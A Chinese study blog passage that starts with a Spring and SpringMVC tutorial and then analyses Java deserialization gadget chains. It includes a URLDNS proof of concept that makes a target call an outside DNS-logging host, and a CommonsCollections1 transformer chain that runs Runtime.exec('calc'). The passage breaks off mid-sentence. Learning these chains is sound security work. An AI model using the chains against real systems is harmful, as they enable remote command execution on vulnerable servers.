maven项目时发现报错。查了下发现可能是自己jdk版本跟idea的不一致的原因。(为了burp使用jdk1.8,但最早学编程时用的jdk10)所以最好保证maven生成构建项目时的一致性(做htb某靶机中遇到了maven build失败的情况,最后解决办法是在更改了语言level后同时还在pom.xml中加入maven版本,jdk版本才完美解决) Springemm没错又从maven跳到spring了。大概是因为spring框架出现的频率还是算比较高的。并且还不能简单的按照servlet开发的流程理解。所以先学习下spring的基础知识。 what is spring 轻量级的Java Web开发框架，以IOC,AOP为内核，使用基本的JavaBean完成以前只可能由EJB完成的工作，取代了EJB臃肿和低效的开发模式。 spring框架采用分层结构。可分为Data Access/Integration、Web、AOP、Aspects、Messaging、Instrumentation、Core Container和Test。 其中core container 核心容器包含几个模块 Core模块：提供了框架的基本组成部分，包括IoC和依赖注入功能；Beans模块 ：提供BeanFactory，是工厂模式的经典实现，Spring将管理对象称为Bean；Context模块：是在Core和Beans模块的基础上建立起来的，以一种类似于JNDI注册的方式访问对象，是访问定义和配置任何对象的媒介。ApplicationContext接口是上下文模块的焦点；SpEL模块：提供了强大的表达式语言，用于在运行时查询和操作对象图； 其他如Data Access/Integration 包含jdb，orm等模块。Web包含Servlet,MVC等模块。暂且不提。 下面还是按照mi1k7ea师傅的流程先做一个简单的spring demo。创建spring项目很简单。idea中创建项目里选择spring后下面选择download选项自动下载依赖。之后就会发现依赖包已经在lib文件夹下了。 首先src下建包top.bycsec。新建两个类 HelloWorld 12345678910111213package top.bycsec;public class HelloWorld &#123; private String message; public void setMessage(String message)&#123; this.message = message; &#125; public void getMessage()&#123; System.out.println(\"Your Message : \" + message); &#125;&#125; MainApp 12345678910111213package top.bycsec;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(\"beans.xml\"); HelloWorld obj = (HelloWorld) context.getBean(\"helloWorld\"); obj.getMessage(); &#125;&#125; 这里我们使用框架的ClassPathXmlApplicationContext()函数来创建应用程序的上下文。这个API加载beans的配置文件并最终基于所提供的API，它处理创建并初始化所有的对象，即在配置文件中提到的beans 同时使用已创建的上下文的getBean()方法来获得所需的bean。这个方法使用bean的ID返回一个最终可以转换为实际对象的通用对象。一旦有了对象，你就可以使用这个对象调用任何类的方法； 那么自然。我们选择加载了beans.xml的配置。所以需要配置beans.xml。 12345678&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt;&lt;bean id=\"helloWorld\" class=\"top.bycsec.HelloWorld\"&gt; &lt;property name=\"message\" value=\"byc_404\"/&gt;&lt;/bean&gt;&lt;/beans&gt; 此处bean 的id自定。但是必须和获取bean时使用getBean()的参数保持一致。 接下来就spring里的几个基础术语学习下 IOC IOC 即 Inversion of Control ,控制反转。指在程序开发中，实例的创建不再由调用者管理，而是由Spring容器创建。Spring容器会负责控制程序之间的关系，而不是由程序代码直接控制，因此控制权由程序代码转移到了Spring容器中，控制权发生了反转，这就是Spring的IoC思想 Spring容器使用依赖注入（DI）来管理组成一个应用程序的组件。这些对象被称为Spring Beans。 即,IoC容器是一个具有依赖注入功能的容器，它可以创建对象，IoC容器负责实例化、定位、配置应用程序中的对象及建立这些对象间的依赖。 IOC容器的使用很大程度上是为了解决开发过程中,出现一个系统有大量的组件，其生命周期和相互之间的依赖关系如果由组件自身来维护，不但大大增加了系统的复杂度，而且会导致组件之间极为紧密的耦合，继而给测试和维护带来了极大的困难。因此使用了IOC。 同时。控制反转这个概念意味着应用程序只需使用已经配置好的组件，那么”依赖注入”这个概念就随之而出了。我们不是new一个对象。而是注入它到其他组件中。这样我们节省了编写配置代码的时间。同时注入也意味着我们可以将这个组件注入到其他类中。体现了组件共享的简单。 也正因如此。我们要让IOC容器知道怎样配置组件。所以才有了上面的使用xml文件进行bean的配置这一做法。 spring提供了两种IOC容器。一种是我们用过了的ApplicationContext.还有一种是比较轻量的BeanFactory. 二者的主要区别在于，如果Bean的某一个属性没有注入，则使用BeanFacotry加载后，在第一次调用getBean()方法时会抛出异常，而ApplicationContext则在初始化时自检，这样有利于检查所依赖的属性是否注入。因此，在实际开发中，通常都选择使用ApplicationContext，而只有在系统资源较少时才考虑使用BeanFactory。 具体用法跟上面的demo没有区别。只是实例化类的区别。因此不再提及。 如果要把上面的流程再仔细分析下的话。其实第一句ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);是加载了bean的配置文件。并且初始化好对象。第二句则使用getBean()这个方法通过配置文件中的 beanid返回真正的对象并使用其调用任何方法。 bean Bean是一个被实例化、组装、并通过Spring IoC容器所管理的对象。这些Bean是由用容器提供的配置元数据创建的，例如前面看到的在XML的表单中的定义。 demo中出现的几个bean的元素 123id 是一个 Bean 的唯一标识符，Spring 容器对 Bean 的配置和管理都通过该属性完成class 该属性指定了 Bean 的具体实现类，它必须是一个完整的类名，使用类的全限定名property &lt;bean&gt;元素的子元素，用于调用 Bean 实例中的 Set 方法完成属性赋值，从而完成依赖注入。该元素的 name 属性指定 Bean 实例中的相应属性名 因此上面bean的xml配置其实是做了这样的注入的 12HelloWorld a= new HelloWorld();a.setMessage(\"byc_404\"); spring中实例化bean除了简单的使用构造方法的构造器实例化。还有静态工厂实例化,实例工厂方式实例化。这些我个人认为可以暂时不用深入了解。主要还是理解了IOC,依赖注入这样的理念。用起来就有明确的思路了。 bean装配 前面似乎一直在说得使用xml文件进行bean的指定。但实际上可以不使用xml进行配置。xml配置实际可能存在难以维护的缺点。因此可以使用其他方法进行装配。 可以使用Annotation来进行配置。常用的几个注解 12345@Required @Required注释应用于bean属性的setter方法，它表明受影响的bean属性在配置时必须放在XML配置文件中@Component 可以使用此注解描述Spring中的Bean，但它是一个泛化的概念，仅仅表示一个组件（Bean），并且可以作用在任何层次。使用时只需将该注解标注在相应类上即可。@Repository 用于将数据访问层（DAO层）的类标识为Spring中的Bean，其功能与@Component 相同。@Service 通常作用在业务层（Service 层），用于将业务层的类标识为Spring中的Bean，其功能与@Component相同。...... 通常我们在类中注明了相关的annotation后，beans.xml配置如下 12345678910111213?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\"&gt; &lt;!--使用context命名空间，通知spring扫描指定目录，进行注解的解析--&gt; &lt;context:component-scan base-package=\"top.bycsec\"/&gt;&lt;/beans&gt; 这样就会在选定的包里自动寻找bean了。 同样我们还可以自动装配bean. TextEditor 12345678910111213141516171819202122package top.bycsec;public class TextEditor &#123; private SpellChecker spellChecker; private String name; public void setSpellChecker( SpellChecker spellChecker ) &#123; this.spellChecker = spellChecker; &#125; public SpellChecker getSpellChecker() &#123; return spellChecker; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void spellCheck() &#123; spellChecker.checkSpelling(); &#125;&#125; SpellChecker 12345678910package top.bycsec;public class SpellChecker &#123; public SpellChecker()&#123; System.out.println(\"Inside SpellChecker constructor.\" ); &#125; public void checkSpelling() &#123; System.out.println(\"Inside checkSpelling.\" ); &#125;&#125; MainApp 123456789101112package top.bycsec;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(\"beans.xml\"); TextEditor te = (TextEditor) context.getBean(\"textEditor\"); te.spellCheck(); &#125;&#125; beans.xml 123456789101112131415161718&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\"&gt; &lt;!-- Definition for textEditor bean --&gt; &lt;bean id=\"textEditor\" class=\"top.bycsec.TextEditor\" autowire=\"byName\"&gt; &lt;property name=\"name\" value=\"byc_404\" /&gt; &lt;/bean&gt; &lt;!-- Definition for spellChecker bean --&gt; &lt;bean id=\"spellChecker\" class=\"top.bycsec.SpellChecker\" /&gt;&lt;/beans&gt; 注意这里我们使用自动装配,也就是配置bean的autowire属性。比如此处的byName就是指： 根据 Property 的 name 自动装配，如果一个 Bean 的 name 和另一个 Bean 中的 Property 的 name 相同，则自动装配这个 Bean 到 Property 中。这里我们textEditor这个bean定义设置为自动装配byName，并且它包含spellChecker属性（即它有一个 setSpellChecker(…) 方法），那么Spring就会查找定义名为spellChecker的bean，并且用它来设置这个属性 如果我们不用自动调用。那么beans.xml中的配置就需要额外设置property 1234&lt;bean id=\"textEditor\" class=\"top.bycsec.TextEditor\"&gt; &lt;property name=\"spellChecker\" ref=\"spellChecker\" /&gt; &lt;property name=\"name\" value=\"byc_404\" /&gt;&lt;/bean&gt; 同理。我们还可以使用byType等autowire属性值来进行自动装配。 今天先看到这。spring的内容还是比较多的 SpringMVC今天简单写个springmvc的demo。其实看了眼廖雪峰老师的spring教程。发现spring的项目基本都是maven构建的。实际上我们就算单纯使用idea中springmvc开发，也可以加入maven结构。 我个人看了下网上csdn的几种写法。有点惊讶有的根本没有写出mvc的作用,有的方法完全拘泥于原来servlet的写法,没有用上spring自己的依赖。最后找到一个阿里云的demo才真正理解了其结构。下面来实际操作下。 首先idea创建springmvc项目。当然刚刚提到了创建maven项目然后引入spring依赖也是可以的。这里我们就暂且先使用idea来帮助我们直接处理好spring的依赖吧。 刚创建完项目首先要注意一点。需要在ProjectStructure =&gt; Artifact 中将两个spring的依赖加入到WEB-INF/lib中。否则待会我们使用tomcat部署时会报错。 接下来先用不加注解的方法写一个class。 12345678910111213141516171819package top.bycsec;import org.springframework.web.servlet.ModelAndView;import org.springframework.web.servlet.mvc.Controller;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class Helloworld implements Controller &#123; @Override public ModelAndView handleRequest(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws Exception &#123; ModelAndView modelAndView = new ModelAndView(); modelAndView.addObject(\"name\",\"byc_404\"); modelAndView.setViewName(\"hello\"); return modelAndView; &#125;&#125; 底下addObject是加载模型数据。setViewName则是选定模型视图。这里视图不使用hello.jsp而是hello是方便书写。我们后面直接在配置中定义后缀即可。 12345678910&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %&gt;&lt;%@ page isELIgnored=\"false\" %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Hello World&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Hello $&#123;name&#125;&lt;/body&gt;&lt;/html&gt; hello.jsp 使用SpEL表达式。即获取我们刚刚的模型数据输出到视图。然后是项目创建时自动生成的dispatcher-servlet.xml。这里可以修改我们bean的相关参数。比如此处设置路由/helloworld。利用beanid让其对应class为HelloWorld.以及视图是在web根目录下找后缀为jsp的文件。配置文件bean部分如下。 12345678910111213141516&lt;bean id=\"handlerMapping\" class=\"org.springframework.web.servlet.handler.SimpleUrlHandlerMapping\"&gt; &lt;property name=\"mappings\"&gt; &lt;props&gt; &lt;prop key=\"/helloworld\"&gt;testHandler&lt;/prop&gt; &lt;/props&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id=\"testHandler\" class=\"top.bycsec.Helloworld\"&gt;&lt;/bean&gt; &lt;bean class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\"&gt; &lt;property name=\"prefix\"&gt; &lt;value&gt;/&lt;/value&gt; &lt;/property&gt; &lt;property name=\"suffix\"&gt; &lt;value&gt;.jsp&lt;/value&gt; &lt;/property&gt; &lt;/bean&gt; 之后加载tomcat配置跑起来即可。访问根目录是index.jsp内容。访问/helloworld则是hello.jsp 当然。这种写法肯定是麻烦了。刚好昨天学过了spring 中自动装载bean的用法。那么此处当然也可以利用注解+配置自动装载bean 新写一个AnnotationHandler类。这里使用注解@Controller将其置为控制器。同时设定其路由为/mdoel。数据与视图跟刚刚差不多。 123456789101112131415161718package top.bycsec;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.servlet.ModelAndView;@Controllerpublic class AnnotationHandler &#123; @RequestMapping(\"/model\") public ModelAndView modelAndViewTest()&#123; ModelAndView modelAndView = new ModelAndView(); modelAndView.addObject(\"name\",\"byc_404\"); modelAndView.setViewName(\"show\"); return modelAndView; &#125;&#125; show.jsp 12345678910&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %&gt;&lt;%@ page isELIgnored=\"false\" %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Model&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Testing model by $&#123;name&#125;&lt;/body&gt;&lt;/html&gt; dispatcher-servlet.xml 123456789101112131415&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd\"&gt; &lt;context:component-scan base-package=\"top.bycsec\"&gt;&lt;/context:component-scan&gt; &lt;bean class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\"&gt; &lt;property name=\"prefix\"&gt; &lt;value&gt;/&lt;/value&gt; &lt;/property&gt; &lt;property name=\"suffix\"&gt; &lt;value&gt;.jsp&lt;/value&gt; &lt;/property&gt; &lt;/bean&gt;&lt;/beans&gt; 直接扫描top.bycsec包十分方便。现在我们访问/model路由最终项目路径 如果要在上面基础上接受参数或者设置路由基本跟servlet差不多 1234567891011121314151617181920212223@Controller@RequestMapping(\"/user\")public class UserController &#123; // 实际URL映射是/user/profile @GetMapping(\"/profile\") public ModelAndView profile() &#123; ... &#125; // 实际URL映射是/user/changePassword @GetMapping(\"/changePassword\") public ModelAndView changePassword() &#123; ... &#125; @PostMapping(\"/signin\") public ModelAndView doSignin( @RequestParam(\"email\") String email, @RequestParam(\"password\") String password, HttpSession session) &#123; ... &#125;&#125; 假如编写的是大量接口的代码(rest api)。spring还提供了@RestController来代替@Controller.这样接口的方法自动变成api方法。数据也是restapi的json数据。 Audit这一部分用于学习java代码审计中一些常见漏洞的深层原理。比如之前反序列化中利用链的深层原因还没有全部学清楚。一些特定情况下的payload编写也还需要基础知识作为底层支持。 真正接触了实战才会发现java在现在仍旧是建站的首选，并且往往可以拿到权限较高的shell.也幸好最近接触java相对更多了点，所以才有胆量去探究这些漏洞利用的底层。 deserialization gadgets先从ysoserialpayload利用链的原理开始审计。 根据我们最早学习到的java反序列化原理。我们知道,序列化利用类必须是实现了Serializable的。这些都是payload可行的必要条件。所以后续这种细节都不必提。 URLDNS URLDNS常用于检测反序列化漏洞。原因很简单:1.依赖原生类Hashmap2.不依赖jdk版本 我们看看Hashmap类。它实现了readObject方法 1234567891011121314151617181920212223242526272829303132333435363738394041424344private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(\"Illegal load factor: \" + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings &lt; 0) throw new InvalidObjectException(\"Illegal mappings count: \" + mappings); else if (mappings &gt; 0) &#123; // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it's the nearest public type to // what we're actually creating. SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings(&#123;\"rawtypes\",\"unchecked\"&#125;) Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(\"unchecked\") K key = (K) s.readObject(); @SuppressWarnings(\"unchecked\") V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125;&#125; 关键在最后一行的putval。我们先看向putval中使用了的hash方法 里面hashCode方法取决于你的key的类。此处是java.net.URL类。 1234567public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;&#125; 而跟进这里的handler发现调用的是java.net.URLStreamHandler的hashCode。看到getHostAddress.就能明白此处肯定是对域名进行了解析。所以会发出DNS请求。 不过。URLDNS的payload编写并非这么简单的一个调用就完事了的。刚刚上面我们看到。hashCode方法里强调如果hashCode不为-1,则直接返回hashCode.而url类中它是默认为-1的。 刚刚我们说，触发点在putVal那里。它的key是通过readObject读取出来的。那说明我们的key写入时是通过writeObject写入的。按照这个线路跟下去,会发现key值最终来自HashMap中table的值。而HashMap 中的table即hash表是通过hashmap.put来写入数据的。 123public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true);&#125; 这里也调用了hash。那么说明这里也会触发dns请求 我们可以写个demoURLDNS的payload编写并非这么简单的一个调用就完事了的。刚刚上面我们看到。hashCode方法里强调如果hashCode不为-1,则直接返回hashCode.所以本地写要将put的第二个参数设为-1才会发出dns请求。 1234567891011121314package top.bycsec;import java.util.HashMap;import java.net.URL;public class exp &#123; public static void main(String[] args) throws Exception &#123; HashMap map = new HashMap(); URL url = new URL(\"http://byc.xxx.ceye.io/\"); map.put(url,-1); &#125;&#125; 我们如果只想在对方机器上检测是否产生dns请求。那么必须得规避掉Hashmap.put这一次调用时里面做出的dns请求。方法也很简单。那就是在put前修改URL的hashCode为其他任意值，就可以在put时不触发dns查询 这一步可以通过反射来达成。 1234567891011121314151617import java.lang.reflect.Field;import java.util.HashMap;import java.net.URL;public class exp &#123; public static void main(String[] args) throws Exception &#123; HashMap map = new HashMap(); URL url = new URL(\"http://byc.59fevd.ceye.io/\"); Field f = Class.forName(\"java.net.URL\").getDeclaredField(\"hashCode\"); f.setAccessible(true); f.set(url,123); System.out.println(url.hashCode()); map.put(url,123); &#125;&#125; 此时调用url的hashCode结果会返回123.也就是直接返回了我们设置的值,避免了dns查询。 hashCode 这个属性不是 transient 的,而是private的。所以放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode 因此。我们实际的poc如下 123456789101112131415161718192021222324package top.bycsec;import java.io.FileOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class URLDNS &#123; public static void main(String[] args) throws Exception &#123; HashMap map = new HashMap(); URL url = new URL(\"http://byc.59fevd.ceye.io/\"); Field f = Class.forName(\"java.net.URL\").getDeclaredField(\"hashCode\"); f.setAccessible(true); f.set(url, 123); map.put(url, \"byc_404\"); f.set(url, -1); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"out.bin\")); oos.writeObject(map); oos.close(); &#125;&#125; 这样就成功将序列化数据写入out.bin,并且没有本地发出dns请求。然后我们模拟真实场景触发 1234567891011121314package top.bycsec;import java.io.FileInputStream;import java.io.ObjectInputStream;public class exp &#123; public static void main(String[] args) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"out.bin\")); ois.readObject(); ois.close(); &#125;&#125; 在p1g3师傅的文章里还对ysoserial的payload进行了分析。我们不妨也看看yso的jar包中是如何书写的(其实直接去看github上源码可以配合注释更好阅读) 1234567891011121314151617181920public Object getObject(String url) throws Exception &#123; URLStreamHandler handler = new URLDNS.SilentURLStreamHandler(); HashMap ht = new HashMap(); URL u = new URL((URL)null, url, handler); ht.put(u, url); Reflections.setFieldValue(u, \"hashCode\", -1); return ht;&#125;static class SilentURLStreamHandler extends URLStreamHandler &#123; SilentURLStreamHandler() &#123; &#125; protected URLConnection openConnection(URL u) throws IOException &#123; return null; &#125; protected synchronized InetAddress getHostAddress(URL u) &#123; return null; &#125;&#125; jar包反编译看不出提示。我们在github源码上则可以找到作者的说法 123//Avoid DNS resolution during payload creation //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.URLStreamHandler handler = new SilentURLStreamHandler(); 配合上面的源码。我们知道这里它新建了一个子类SilentURLStreamHandler继承URLStreamHandler。那当它在URLDNSpayload里调用put时是直接调用自定义的getHostAddress.这个方法返回null. 而当反序列化执行时,因为这里的SilentURLStreamHandler属性被设置为transient，而被transient修饰的变量无法被序列化，所以最终反序列化读取出来的transient依旧是其初始值，也就是URLStreamHandler。 到此为止。我们完成了整条urldns链的分析。gadgets如下 12345HashMap#readObject HashMap#hash URL#hashCode URLStreamHandler#hashCode URLStreamHandler#getHostAddress CommonCollections1 先说下环境的配置问题。因为cc链子好几条都只能用在jdk1.7下了所以得弄个jdk1.7的环境。开始打算用kali虚拟机现成的的jvm里的1.7,结果因为官方库已经没有openjdk7了，idea识别不到。所以只好又下了一个jdk1.7. 因为只是项目用，所以不需要添加环境变量什么的就可以了。不过需要注意的是idea项目切换jdk版本的话,尤其对于我们maven项目而言,一定要把设置里所有默认值都改为jdk1.7.包括：pom.xml里java version与maven 编译version;project structure里project sdk 以及modules;Language level;java Compiler version 全部调整为1.7才能不出错。否则会在编译时报无效的源以及编译完后无效的目标发行版这两种错。修改好后就没有什么好担心的了。开始maven导库审计吧。pom.xml 12345678910111213141516171819202122232425&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;maven.compiler.source&gt;1.7&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.7&lt;/maven.compiler.target&gt; &lt;java.version&gt;1.7&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; &lt;version&gt;4.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.25.0-GA&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 首先是一个关于动态代理的例子。 1.java中代理类的作用是:调用不可以直接被实例化的接口方法。2.动态代理可以直接”创建”某个接口的实例，对其方法进行调用.3.调用某个动态代理对象的方法时，都会触发代理类的invoke方法. 先定义一个接口。它有一个helloworld方法。 12345package top.bycsec;public interface Hello &#123; void helloworld(String name);&#125; 接下来调用这个exp。我们可以直接实例化一个handler.它实现了InvocationHandler这个接口。同时需要重写invoke方法。此处我们让他在方法名为helloworld时输出自定义内容然后实例化一个代理对象hello.他需要ClassLoader,要代理的接口数组以及调用接口时触发的对应方法作为构造参数。exp 1234567891011121314151617181920212223package top.bycsec;import java.lang.reflect.Proxy;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class exp &#123; public static void main(String[] args) throws Exception &#123; InvocationHandler handler = new InvocationHandler()&#123; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; if (method.getName().equals(\"helloworld\")) &#123; System.out.println(\"Hello, \" + args[0]); &#125; return null; &#125; &#125;; Hello hello = (Hello)Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Hello.class&#125;,handler); hello.helloworld(\"byc_404\"); &#125;&#125; 这样在我们调用接口的helloworld时。就会触发invoke方法里的内容。输出Hello, byc_404 接下来我们来看看cc1链子的内容。首先从执行命令的反射gadget开始。这里我确认过一遍，应该是第一部分跟CC5时就看过了。结果现在已经忘光了……所以再看一遍。 首先是commonscollections这个包里Trandsformer这个接口 12345package org.apache.commons.collections;public interface Transformer &#123; Object transform(Object var1);&#125; 它实现了类型转换的功能。其中实现了这个接口的类主要有三个，也就是我们后面构造payload要用到的. InvokerTransformerConstantTransformerChainedTransformer他们都实现了 Transformer 以及 Serializable接口。 看下他们的transform方法InvokeTransformer 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var5) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); &#125; catch (IllegalAccessException var6) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); &#125; catch (InvocationTargetException var7) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", var7); &#125; &#125;&#125; 一个非常典型的反射调用方法的功能 ConstantTransformer 1234567public Object transform(Object input) &#123; return this.iConstant;&#125;public ConstantTransformer(Object constantToReturn) &#123; this.iConstant = constantToReturn;&#125; 返回某参数。如果去看了它的构造方法就会发现其实transform是一个原封不动返回的功能。 ChainedTransformer 1234567public Object transform(Object object) &#123; for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123; object = this.iTransformers[i].transform(object); &#125; return object;&#125; 执行一个for循环进行循环调用。对每个传入的transformer都调用其transform方法并作为下一次的参数。 如果直接抽象点理解，大概是能理解下面的exp的 123456789101112131415161718192021package top.bycsec;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.*;public class cc1 &#123; public static void main(String[] args)&#123; ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; \"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123; String.class &#125;, new Object[]&#123;\"calc\"&#125;)&#125;); chain.transform(123); &#125;&#125; 整体上是一个ChainedTransformer循环调用transform的过程。其中ConstantTransformer获取到Runtime的类，后面循环调用了三个invoke获取方法执行。 下面细节化的解释下.毕竟cc链子所有命令执行部分都是这条链(没记错的话) 先说InvokeTransformer的transform方法。上面源码里说明了它主要是一个反射的过程。其接受的参数是一个对象。 1234try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); 最大的好处就是这里所有反射参数都是可控的。所以其实这里就能rce. 123Runtime runtime = Runtime.getRuntime();Transformer invoketransformer = new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"calc\"&#125;);invoketransformer.transform(runtime); 只不过显然我们没有直接传入一个Runtime.getRuntime()这样一个实例的可能。所以需要利用一下其他的类作辅助。 比如说上面提到的ConstantTransformer.其transform方法会返回自身。所以说可以 123Object constantTransformer = new ConstantTransformer(Runtime.getRuntime()).transform(123);Transformer invoketransformer = new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"calc\"&#125;);invoketransformer.transform(constantTransformer); 再加上ChainedTransform会调用其输入的transform这个特点，我们就可以进一步来到cc反射exp的雏形 123456ChainedTransformer chain = new ChainedTransformer(new Transformer[]&#123; new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"calc\"&#125;)&#125;);chain.transform(123); 此时已不再需要输入变量为对象，而是可以为任意值(此处为123)。 只不过这里有一个问题，我们曾经说过 java反序列某类时,该类的所有属性必须是可序列化的 此处Runtime.getRuntime()还是返回了runtime对象，它不是可序列化的。即反序列化时上述exp会报错抛出NotSerializableException。 当然解决方法也很简单，不允许直接获取的话，直接动态调用就好了。也就是继续用反射获取Runtime.所以才有了最完整的exp中 1234567891011ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; \"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123; String.class &#125;, new Object[]&#123;\"calc\"&#125;)&#125;);chain.transform(123); 第一步反射使用getMethod获取getRuntime这个方法对象。再invoke获取getRuntime的执行结果。最后直接反射执行exec calc.或者传字符串数组执行特殊命令弹shell. 到这一步为止达成了： 